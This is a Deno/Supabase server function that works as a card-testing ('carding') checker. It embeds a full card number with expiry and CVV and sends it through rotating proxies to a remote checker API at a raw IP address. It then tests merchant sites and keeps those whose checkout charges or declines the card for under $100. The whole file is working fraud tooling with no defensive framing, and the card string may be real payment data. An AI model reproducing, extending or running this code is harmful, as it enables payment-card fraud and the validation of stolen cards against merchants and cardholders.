import { createClient } from "npm:@supabase/supabase-js@2";

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

const TEST_CC = "4266841674104656|03|27|908";
const API_BASE_URL = "http://108.165.12.183:8081/";

const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];

const badResponses = [
  "Site not supported",
  "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
  "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
  "Payment method not available",
  "ARTIFACT_DISSATISFACTION",
  "VALIDATION_CUSTOM",
  '"Gateway":"Authorize.net"',
];

const PROXY_DEAD_INDICATORS = [
  'proxy error', 'proxy authentication', 'connection refused',
  'proxy connect', 'tunneling socket', 'proxy_error', 'bad proxy',
  'cannot connect to host', 'socks', 'econnrefused', 'econnreset',
];

const CURL_RETRY_INDICATORS = [
  'failed to perform', 'getaddrinfo', 'curl', 'thread failed to start',
  'name or service not known', 'could not resolve host',
];

const MAX_RETRIES = 2;

const checkSingleSite = async (
  siteUrl: string,
  proxyStr: string,
  proxyId: string | null,
  supabase: ReturnType<typeof createClient>,
  retryCount = 0,
): Promise<{ url: string; status: string; price: number; priceStr: string; apiResponse?: string; error?: string; proxyDead?: boolean }> => {
  const timeoutMs = 55000;

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

    const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(TEST_CC)}&url=${encodeURIComponent(siteUrl)}&proxy=${proxyStr}`;

    console.log(`[Check] ${siteUrl} | proxy=${proxyStr ? 'yes' : 'none'}`);

    const response = await fetch(apiUrl, {
      method: "GET",
      signal: controller.signal,
      headers: {
        "Accept": "application/json, text/plain, */*",
        "Cache-Control": "no-cache",
      },
    });

    clearTimeout(timeoutId);
    const rawText = await response.text();

    if (!rawText || rawText.trim() === "") {
      console.log(`[Result] ${siteUrl} → ERROR (empty response)`);
      return { url: siteUrl, status: "error", price: 0, priceStr: "$0.00", error: "Empty response" };
    }

    const rawLower = rawText.toLowerCase();

    // Check for curl/DNS errors → retry with same site
    const isCurlError = CURL_RETRY_INDICATORS.some(ind => rawLower.includes(ind));
    if (isCurlError) {
      if (retryCount < MAX_RETRIES) {
        console.log(`[Retry] ${siteUrl} → curl/DNS error, retry ${retryCount + 1}/${MAX_RETRIES}`);
        await new Promise(r => setTimeout(r, 2000 * (retryCount + 1)));
        return checkSingleSite(siteUrl, proxyStr, proxyId, supabase, retryCount + 1);
      }
      console.log(`[Result] ${siteUrl} → ERROR (curl/DNS failed after ${MAX_RETRIES} retries)`);
      return { url: siteUrl, status: "error", price: 0, priceStr: "$0.00", apiResponse: rawText.substring(0, 500), error: "DNS resolution failed" };
    }

    // Check if proxy is dead
    const isProxyDead = PROXY_DEAD_INDICATORS.some(ind => rawLower.includes(ind));
    if (isProxyDead) {
      if (proxyId) {
        console.log(`[Result] Proxy dead for ${siteUrl}, removing proxy ${proxyId}`);
        await supabase.from("proxies").delete().eq("id", proxyId);
      }
      return { url: siteUrl, status: "error", price: 0, priceStr: "$0.00", apiResponse: rawText, error: "Dead proxy", proxyDead: true };
    }

    // Check for bad responses — site is broken/unsupported
    const isBad = badResponses.some(bad => rawLower.includes(bad.toLowerCase()));
    if (isBad) {
      await supabase.from("gateway_urls").delete().eq("url", siteUrl);
      console.log(`[Result] ${siteUrl} → DEAD (bad response)`);
      return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse: rawText.substring(0, 500), error: "Bad response" };
    }

    // Parse JSON response from API: {"Gateway":"...", "Price":N, "Response":"...", "Status":bool, "cc":"..."}
    try {
      const json = JSON.parse(rawText);
      const gateway = json.Gateway || "";
      const price = typeof json.Price === "number" ? json.Price : 0;
      const priceStr = price > 0 ? `$${price.toFixed(2)}` : "$0.00";
      const apiResponse = json.Response ? String(json.Response).replace(/<[^>]*>/g, '').substring(0, 500) : "";
      const apiStatus = json.Status; // boolean: true = charged, false = declined/error
      const responseLower = apiResponse.toLowerCase();

      // Authorize.net gateway → remove site
      if (gateway === "Authorize.net") {
        await supabase.from("gateway_urls").delete().eq("url", siteUrl);
        console.log(`[Result] ${siteUrl} → DEAD (Authorize.net)`);
        return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse, error: "Authorize.net gateway" };
      }

      // UNKNOWN gateway with no price → check if response indicates site is alive
      if (gateway === "UNKNOWN" && price === 0) {
        // CARD_DECLINED means the site processed the card → site IS alive
        if (responseLower.includes('card_declined') || responseLower.includes('declined') || 
            responseLower.includes('insufficient') || responseLower.includes('do_not_honor') || 
            responseLower.includes('3ds') || responseLower.includes('fraud') ||
            responseLower.includes('restricted') || responseLower.includes('not_permitted')) {
          console.log(`[Result] ${siteUrl} → LIVE (UNKNOWN gateway, card declined = site active)`);
          return { url: siteUrl, status: "live", price: 0, priceStr: "$0.00", apiResponse };
        }
        await supabase.from("gateway_urls").delete().eq("url", siteUrl);
        console.log(`[Result] ${siteUrl} → DEAD (UNKNOWN gateway, no price)`);
        return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse, error: "Unknown gateway" };
      }

      // CARD_DECLINED with known gateway and price → site is LIVE, update price
      if (responseLower.includes('card_declined') && price > 0 && price <= 100) {
        await supabase.from("gateway_urls").upsert({ url: siteUrl, price }, { onConflict: "url" });
        console.log(`[Result] ${siteUrl} → LIVE (card_declined, ${priceStr}, gateway: ${gateway})`);
        return { url: siteUrl, status: "live", price, priceStr, apiResponse };
      }

      // Price over $100 → remove site
      if (price > 100) {
        await supabase.from("gateway_urls").delete().eq("url", siteUrl);
        console.log(`[Result] ${siteUrl} → DEAD (price too high: ${priceStr})`);
        return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse, error: "Price exceeds $100" };
      }

      // Status=true → CHARGED/success → site is live
      if (apiStatus === true) {
        if (price > 0) {
          await supabase.from("gateway_urls").upsert({ url: siteUrl, price }, { onConflict: "url" });
        }
        console.log(`[Result] ${siteUrl} → LIVE (charged, ${priceStr}, gateway: ${gateway})`);
        return { url: siteUrl, status: "live", price, priceStr, apiResponse };
      }

      // Status=false → declined/error → site is still alive if gateway is known & price > 0
      if (apiStatus === false) {
        // Check for MERCHANDISE_EXPECTED_PRICE_MISMATCH — site issue
        if (responseLower.includes('merchandise_expected_price_mismatch')) {
          await supabase.from("gateway_urls").delete().eq("url", siteUrl);
          console.log(`[Result] ${siteUrl} → DEAD (price mismatch)`);
          return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse, error: "Price mismatch" };
        }

        // Known gateway with price → site is LIVE (merchant processed the card)
        if (gateway && gateway !== "UNKNOWN" && price > 0) {
          await supabase.from("gateway_urls").upsert({ url: siteUrl, price }, { onConflict: "url" });
          console.log(`[Result] ${siteUrl} → LIVE (declined but active, ${priceStr}, gateway: ${gateway})`);
          return { url: siteUrl, status: "live", price, priceStr, apiResponse };
        }

        // Known gateway but no price → still alive, keep existing record
        if (gateway && gateway !== "UNKNOWN") {
          // Check if response indicates the card was actually processed
          if (responseLower.includes('declined') || responseLower.includes('do_not_honor') ||
              responseLower.includes('card_declined') || responseLower.includes('insufficient') ||
              responseLower.includes('generic_decline') || responseLower.includes('fraud') ||
              responseLower.includes('restricted') || responseLower.includes('pickup_card') ||
              responseLower.includes('lost_card') || responseLower.includes('stolen_card') ||
              responseLower.includes('not_permitted') || responseLower.includes('3ds') ||
              responseLower.includes('ds_required')) {
            console.log(`[Result] ${siteUrl} → LIVE (declined, gateway: ${gateway}, no price update)`);
            return { url: siteUrl, status: "live", price: 0, priceStr: "$0.00", apiResponse };
          }
          
          // Error from gateway but not a decline → might be temporary
          console.log(`[Result] ${siteUrl} → ERROR (gateway: ${gateway}, response: ${apiResponse.substring(0, 100)})`);
          return { url: siteUrl, status: "error", price: 0, priceStr: "$0.00", apiResponse, error: "Gateway error" };
        }

        // No gateway, no price → dead
        await supabase.from("gateway_urls").delete().eq("url", siteUrl);
        console.log(`[Result] ${siteUrl} → DEAD (no gateway, no price)`);
        return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse };
      }

      // Fallback: has price → live
      if (price > 0 && price <= 100) {
        await supabase.from("gateway_urls").upsert({ url: siteUrl, price }, { onConflict: "url" });
        console.log(`[Result] ${siteUrl} → LIVE (price detected: ${priceStr})`);
        return { url: siteUrl, status: "live", price, priceStr, apiResponse };
      }

      console.log(`[Result] ${siteUrl} → DEAD (unrecognized: ${rawText.substring(0, 200)})`);
      return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse };

    } catch {
      // Not JSON — text fallback
      console.log(`[Result] ${siteUrl} → ERROR (non-JSON response: ${rawText.substring(0, 200)})`);
      return { url: siteUrl, status: "error", price: 0, priceStr: "$0.00", apiResponse: rawText.substring(0, 500), error: "Non-JSON response" };
    }

  } catch (err) {
    const msg = err instanceof Error ? err.message : "Unknown error";
    console.log(`[Error] ${siteUrl}: ${msg}`);
    return { url: siteUrl, status: "error", price: 0, priceStr: "$0.00", error: msg.includes('abort') ? 'Timeout' : msg };
  }
};

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
    
    const token = authHeader.replace("Bearer ", "");
    const { data: { user }, error: authError } = await supabase.auth.getUser(token);

    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const { data: roleData } = await supabase
      .from("user_roles")
      .select("role")
      .eq("user_id", user.id)
      .eq("role", "admin")
      .maybeSingle();

    if (!roleData) {
      return new Response(JSON.stringify({ error: "Admin access required" }), { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const { url, proxy: proxyOverride, proxyId: proxyIdOverride } = await req.json();

    if (!url || typeof url !== "string") {
      return new Response(JSON.stringify({ error: "No URL provided" }), { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    let proxyStr = "";
    let proxyId: string | null = null;
    
    if (proxyOverride && typeof proxyOverride === "string") {
      proxyStr = proxyOverride;
      if (proxyIdOverride && typeof proxyIdOverride === "string") {
        proxyId = proxyIdOverride;
      }
    } else {
      const { data: liveProxies } = await supabase
        .from("proxies")
        .select("*")
        .eq("status", "live");

      if (liveProxies && liveProxies.length > 0) {
        const randomProxy = getRandomItem(liveProxies);
        proxyId = randomProxy.id;
        proxyStr = randomProxy.username && randomProxy.password
          ? `${randomProxy.ip}:${randomProxy.port}:${randomProxy.username}:${randomProxy.password}`
          : `${randomProxy.ip}:${randomProxy.port}`;
      }
    }

    const result = await checkSingleSite(url, proxyStr, proxyId, supabase);

    return new Response(JSON.stringify(result), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error("Health check error:", error);
    return new Response(
      JSON.stringify({ error: error instanceof Error ? error.message : "Internal error" }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
